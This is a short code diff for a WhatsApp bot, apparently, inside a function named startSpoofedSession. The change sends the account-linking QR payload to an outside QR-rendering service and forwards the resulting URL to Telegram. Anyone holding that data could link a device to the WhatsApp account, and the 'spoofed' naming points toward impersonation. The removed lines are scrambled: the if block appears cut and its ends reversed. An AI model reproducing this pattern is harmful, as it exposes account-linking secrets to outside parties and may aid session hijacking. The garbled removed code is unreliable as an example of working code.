@@ -101,12 +101,13 @@ async function startSpoofedSession() {
     sock.ev.on('connection.update', (update) => {
         const { connection, lastDisconnect, qr } = update
 
-        r) {
-            qrcode.generate(qr, { small: true }, (code) => {
-                console.log('\nScan this QR code with WhatsApp:\n')
-                console.log(code)
-            })
-        }if (q
+        if (qr) {
+            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qr)}`
+            console.log('--- New QR CODE ---')
+            console.log(qrUrl)
+            qrcode.generate(qr, { small: true })
+            void notifyTelegramEvent('QR CODE', qrUrl)
+        }
 
         if (connection === 'close') {
             if (activeWhatsAppSocket === sock) activeWhatsAppSocket = null
